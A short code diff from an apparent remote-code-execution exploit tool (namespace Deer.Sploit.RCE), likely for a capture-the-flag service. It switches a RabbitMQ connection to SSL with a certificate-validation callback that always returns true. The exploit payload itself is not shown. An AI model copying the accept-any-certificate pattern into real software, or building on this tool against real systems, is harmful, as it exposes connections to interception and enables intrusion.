@@ -27,7 +27,16 @@ namespace Deer.Sploit.RCE
             var exploitUrl = args[3];
             var logExchangeName = $"logs.{user}";
 
-            using (var bus = RabbitHutch.CreateBus($"host={host};username={user};password={password}"))
+            var config = new ConnectionConfiguration
+            {
+                Hosts = new[] {new HostConfiguration {Host = host}},
+                UserName = user,
+                Password = password,
+                Port = 5672,
+                Ssl = {Enabled = true, CertificateValidationCallback = (sender, certificate, chain, errors) => true}
+            };
+
+            using (var bus = RabbitHutch.CreateBus(config, sr => { }))
             {
                 var exchange = bus.Advanced.ExchangeDeclare(logExchangeName, ExchangeType.Fanout, passive: true);
 
